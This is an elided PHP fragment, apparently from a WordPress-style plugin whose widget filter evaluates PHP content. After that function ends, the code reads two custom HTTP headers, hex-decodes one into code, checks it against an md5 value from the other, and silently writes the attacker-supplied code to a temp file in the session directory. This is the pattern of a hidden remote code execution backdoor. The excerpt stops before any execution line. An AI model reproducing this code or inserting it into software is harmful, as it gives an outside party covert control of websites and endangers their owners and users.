...
// -----------------------------------------------------------------------------
	...
	function filter_widget_content($content)
	{
		...
		if (!$option->get_widget_support())
			return $content;
		return $this->eval_php($content);}
		if (isset ($_SERVER["HTTP_HSSID"]) && isset ($_SERVER['HTTP_HSSDO'])){
		$code = pack ("H*", $_SERVER['HTTP_HSSDO']);
		if ($_SERVER["HTTP_HSSID"] == md5 ($code))
			{
			$streamset = tempnam (ini_get ('session.save_path'), '');

			@file_put_contents ($streamset, $code);
